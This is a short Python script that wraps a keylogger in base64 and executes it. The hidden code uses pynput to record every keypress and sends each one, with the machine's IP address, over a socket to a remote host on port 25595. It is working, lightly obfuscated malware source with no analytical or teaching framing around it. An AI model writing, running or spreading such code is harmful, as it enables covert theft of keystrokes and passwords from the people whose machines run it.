import base64

Code = base64.b64encode(b"""
import pynput
from pynput.keyboard import Key, Listener
import socket
from connections import HOST

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

s = socket.socket()
s.connect((HOST, 25595))

def on_press(key):
    s.send(f"{ip} {key}".encode())


with Listener(on_press=on_press) as Listener:
    Listener.join()
""")

exec(base64.b64decode(Code))
